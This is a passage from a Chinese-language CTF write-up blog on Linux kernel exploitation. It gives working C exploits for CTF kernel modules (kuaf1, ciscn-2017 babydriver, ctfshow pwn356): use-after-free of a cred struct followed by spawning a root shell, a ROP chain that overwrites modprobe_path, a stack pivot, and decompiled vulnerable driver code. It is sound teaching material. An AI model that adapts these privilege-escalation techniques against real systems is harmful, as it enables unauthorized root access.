        <span class="s">"xor rdi, rdi;"</span>
        <span class="s">"mov rcx, prepare_kernel_cred;"</span>
        <span class="s">"call rcx;"</span>
        <span class="s">"mov rcx, commit_creds;"</span>
        <span class="s">"call rcx;"</span>
        <span class="c1">// swapgs_restore_regs_and_return_to_usermode -- mov rdi,rsp</span>
    <span class="p">);</span>
<span class="p">}</span><span class="kt">size_t</span> <span class="n">sc_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">shellcode</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>


<span class="kt">char</span> <span class="o">*</span><span class="n">vuln_ko</span> <span class="o">=</span> <span class="s">"/proc/kuaf1"</span><span class="p">;</span>


<span class="kt">int</span> <span class="nf">odp</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"open error."</span><span class="p">);</span>
        <span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span>

<span class="kt">size_t</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>

    <span class="n">bind_core</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">save_status</span><span class="p">();</span>
    <span class="kt">size_t</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">odp</span><span class="p">(</span><span class="n">vuln_ko</span><span class="p">);</span>
    <span class="n">fd1</span> <span class="o">=</span> <span class="n">odp</span><span class="p">(</span><span class="n">vuln_ko</span><span class="p">);</span>

    <span class="n">lss</span><span class="p">(</span><span class="s">"fd = "</span><span class="p">,(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">fd</span><span class="p">);</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="mh">0x10001</span> <span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x20</span><span class="p">);</span> <span class="c1">// kmalloc 0x20</span>

    <span class="n">close</span><span class="p">(</span><span class="n">fd1</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">statfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/stat"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>

    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="n">hexdump</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">single_start</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">single_start</span> <span class="o">-</span> <span class="n">stbase</span><span class="p">(</span><span class="mh">0xffffffff812d2910</span><span class="p">);</span>

    <span class="n">lss</span><span class="p">(</span><span class="s">"kernel_base"</span><span class="p">,</span> <span class="n">kernel_base</span><span class="p">);</span>

   
    <span class="kt">size_t</span> <span class="n">gadstack</span> <span class="o">=</span> <span class="mh">0xebc58948</span><span class="p">;</span>

    <span class="c1">// 0xffffffff81482605: mov esp, 0xebc58948; ret;</span>
    <span class="kt">size_t</span> <span class="n">target</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="n">stbase</span><span class="p">(</span><span class="mh">0xffffffff81482605</span><span class="p">);</span>

    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">target</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="o">*</span><span class="n">nbuf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="n">gadstack</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xFFF</span><span class="p">,</span> <span class="mi">4</span><span class="o">*</span><span class="n">PAGE</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_FIXED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="kt">size_t</span> <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="n">stbase</span><span class="p">(</span><span class="mh">0xffffffff82b3f400</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0xffffffff8133e208</span><span class="p">;</span> <span class="c1">// pop rdi; ret;</span>
    <span class="kt">size_t</span> <span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0xffffffff8103aa26</span><span class="p">;</span> <span class="c1">// pop rsi; ret;</span>
    <span class="kt">size_t</span> <span class="n">mov_rsi_edi</span> <span class="o">=</span> <span class="mh">0xffffffff81c8e47c</span><span class="p">;</span> <span class="c1">//mov dword ptr [rsi - 0x16000005], edi; ret;</span>
    <span class="kt">size_t</span> <span class="n">swapgs_restore_regs_and_return_to_usermode</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="n">stbase</span><span class="p">(</span><span class="mh">0xffffffff82001637</span><span class="p">);</span>
    <span class="c1">// 0xffffffff82001637 &lt;common_interrupt_return+103&gt;:    mov    rdi,rsp</span>
    <span class="c1">// 0xffffffff8200163a &lt;common_interrupt_return+106&gt;:    mov    rsp,QWORD PTR gs:[rip+0x7e0049c2]        # 0x6004 &lt;cpu_tss_rw+4&gt;</span>
    <span class="c1">// 0xffffffff82001642 &lt;common_interrupt_return+114&gt;:    push   QWORD PTR [rdi+0x30]</span>
    <span class="c1">// 0xffffffff82001645 &lt;common_interrupt_return+117&gt;:    push   QWORD PTR [rdi+0x28]</span>

    <span class="n">puts</span><span class="p">(</span><span class="n">g_color</span> <span class="s">"Constructing ROP"</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">tf</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/tmp"</span><span class="p">,</span><span class="s">"/e1</span><span class="se">\x00\x00</span><span class="s">"</span><span class="p">};</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x948</span><span class="o">/</span><span class="mi">8</span><span class="p">;</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="n">tf</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rsi</span><span class="p">;</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">modprobe_path</span> <span class="o">+</span> <span class="mh">0x16000005</span><span class="p">;</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rsi_edi</span><span class="p">;</span>

    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="n">tf</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rsi</span><span class="p">;</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">modprobe_path</span> <span class="o">+</span> <span class="mh">0x16000005</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rsi_edi</span><span class="p">;</span>

    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_restore_regs_and_return_to_usermode</span><span class="p">;</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">modprobe_rce</span><span class="p">;</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
    <span class="n">nbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>


    <span class="n">puts</span><span class="p">(</span><span class="n">g_color</span> <span class="s">"Hijacking RSP..."</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="n">statfd</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">nbuf</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">);</span>
  
<span class="p">}</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">env</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">environ</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">env</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="n">doMain</span><span class="p">();</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>





</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h3 id="这题的小结"><span class="me-2">这题的小结</span><a href="#这题的小结" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>上面利用的是 <code class="language-plaintext highlighter-rouge">int statfd = open("/proc/self/stat", O_RDONLY);</code>​ 会申请一个 0x20 的 堆块，通过UAF对此堆块的控制流劫持（read触发）</p>

<p>‍</p>

<p>这题关闭里 smap  内核可以直接访问用户态的段，所以说 劫持 rsp 就变得简单了</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">kmalloc</span><span class="p">(</span><span class="mh">0x400cc0</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span> <span class="c1">// `open("/proc/self/stat", O_RDONLY)`</span>

<span class="err">不到还有没有其他结构体会用这个</span><span class="n">flags</span> <span class="mh">0x400cc0</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h2 id="ciscn-2017-babydriver"><span class="me-2">ciscn-2017-babydriver</span><a href="#ciscn-2017-babydriver" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<p>‍</p>

<h3 id="exploit-1"><span class="me-2">exploit-1</span><a href="#exploit-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
</span>

<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="kt">int</span> <span class="nf">odp</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">doMain</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span> <span class="n">odp</span><span class="p">(</span><span class="s">"/dev/babydev"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">fd2</span> <span class="o">=</span> <span class="n">odp</span><span class="p">(</span><span class="s">"/dev/babydev"</span><span class="p">);</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="mh">0x10001</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xa8</span><span class="p">);</span><span class="c1">// 申请 0xa8</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd2</span><span class="p">);</span> <span class="c1">// 这里释放，但是 还有一个 fd1 可以继续控制 堆块</span>
    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span> <span class="c1">// 子进程会为struct cred 结构体申请一段内存空间（0xa8字节大小，对应kmalloc-0xc0） 会申请到上面free 的堆块</span>
    <span class="k">if</span><span class="p">(</span><span class="n">pid</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x20</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
        <span class="n">write</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x20</span><span class="p">);</span> <span class="c1">// 此时控制的就是 子进程的 cred 结构体， 把前面的个 id 改成空 就提权了</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="n">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">env</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">environ</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">env</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="n">doMain</span><span class="p">();</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250220202721-am68vb6.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20250220202721-am68vb6.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="ctfshow-pwn356"><span class="me-2">ctfshow-pwn356</span><a href="#ctfshow-pwn356" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<h3 id="题目分析-2"><span class="me-2">题目分析</span><a href="#题目分析-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>可能是哪个比赛的题目吧？</p>

<p>‍</p>

<ul>
  <li>init 文件</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>
<span class="nb">chown</span> <span class="nt">-R</span> 0:0 / 
mount <span class="nt">-t</span> tmpfs tmpfs /tmp
mount <span class="nt">-t</span> proc proc /proc
mount <span class="nt">-t</span> sysfs sysfs /sys
mount <span class="nt">-t</span> devtmpfs none /dev
/sbin/mdev <span class="nt">-s</span>
<span class="nb">mkdir</span> <span class="nt">-p</span> /dev/pts
mount <span class="nt">-vt</span> devpts <span class="nt">-o</span> <span class="nv">gid</span><span class="o">=</span>4,mode<span class="o">=</span>620 none /dev/pts
<span class="nb">chmod </span>666 /dev/ptmx
<span class="nb">cat</span> /proc/kallsyms <span class="o">&gt;</span> /tmp/kallsyms <span class="c"># 通过这里可以泄露 kernel 地址</span>

<span class="nb">echo </span>1 <span class="o">&gt;</span> /proc/sys/kernel/kptr_restrict
<span class="nb">echo </span>1 <span class="o">&gt;</span> /proc/sys/kernel/dmesg_restrict
<span class="nb">chown </span>0:0 /root/ctfshow_flag
<span class="nb">chmod </span>400 /root/ctfshow_flag
<span class="nb">chmod </span>777 /tmp

insmod /show.ko

<span class="nb">cat</span> /root/logo
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Boot took </span><span class="si">$(</span><span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span> /proc/uptime<span class="si">)</span><span class="s2"> seconds</span><span class="se">\n</span><span class="s2">"</span>
poweroff <span class="nt">-d</span> 120 <span class="nt">-f</span> &amp;
setsid ./bin/cttyhack setuidgid 1000 /bin/sh
<span class="nb">echo</span> <span class="s1">'sh end!\n'</span>
umount /proc
umount /sys


</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>一个<strong>LKM</strong> 内核模块 漏洞</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
</pre></td><td class="rouge-code"><pre><span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">show_copy_func</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="n">_QWORD</span> <span class="n">v2</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-50h] BYREF</span>

  <span class="n">v2</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_215</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">a1</span> <span class="o">&gt;</span> <span class="mi">63</span> <span class="p">)</span>                                <span class="c1">// long int 有符号比较，可以负数绕过</span>
  <span class="p">{</span>
    <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_2A1</span><span class="p">);</span>
    <span class="k">return</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
    <span class="n">qmemcpy</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">name</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">a1</span><span class="p">);</span>   <span class="c1">// len 是 unsigend short</span>
  <span class="p">}</span>                                             <span class="c1">// 然后就可以直接栈溢出</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">unsigned</span> <span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">show_read</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// rdi</span>
  <span class="n">__int64</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// rcx</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">char</span> <span class="n">v5</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-50h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-10h]</span>

  <span class="n">v6</span> <span class="o">=</span> <span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_25B</span><span class="p">);</span>
  <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_275</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">16LL</span><span class="p">;</span> <span class="n">i</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">v2</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="s">"Welcome to the CTFshow-KernelPWN.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">[</span><span class="n">off</span><span class="p">],</span> <span class="mi">64LL</span><span class="p">);</span>   <span class="c1">// 通过控制 off 的值，可以从kernel stack 上泄露 canary</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">result</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v6</span><span class="p">;</span>
  <span class="kr">__asm</span> <span class="p">{</span> <span class="n">swapgs</span> <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>


<span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">show_ioctl</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="n">__int64</span> <span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">switch</span> <span class="p">(</span> <span class="n">a2</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">case</span> <span class="mh">0x6677889B</span><span class="p">:</span>
      <span class="n">show_read</span><span class="p">(</span><span class="n">a3</span><span class="p">);</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="mh">0x6677889C</span><span class="p">:</span>
      <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_2CD</span><span class="p">);</span>
      <span class="n">off</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>          <span class="c1">// 可以设置偏移</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="mh">0x6677889A</span><span class="p">:</span>
      <span class="n">printk</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_2B3</span><span class="p">);</span>
      <span class="n">show_copy_func</span><span class="p">(</span><span class="n">a3</span><span class="p">);</span>
      <span class="k">break</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h3 id="exploit-5"><span class="me-2">exploit</span><a href="#exploit-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
#define stbase(value) ((value) - 0xffffffff81000000ULL)
</span>
<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">odp</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">){</span> <span class="k">return</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span> <span class="p">}</span>

<span class="kt">size_t</span> <span class="nf">hex_string_to_size_t</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">hex_str</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hex_str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'0'</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">hex_str</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'x'</span> <span class="o">||</span> <span class="n">hex_str</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'X'</span><span class="p">))</span> <span class="p">{</span> <span class="n">hex_str</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">hex_str</span><span class="p">)</span> <span class="p">{</span>
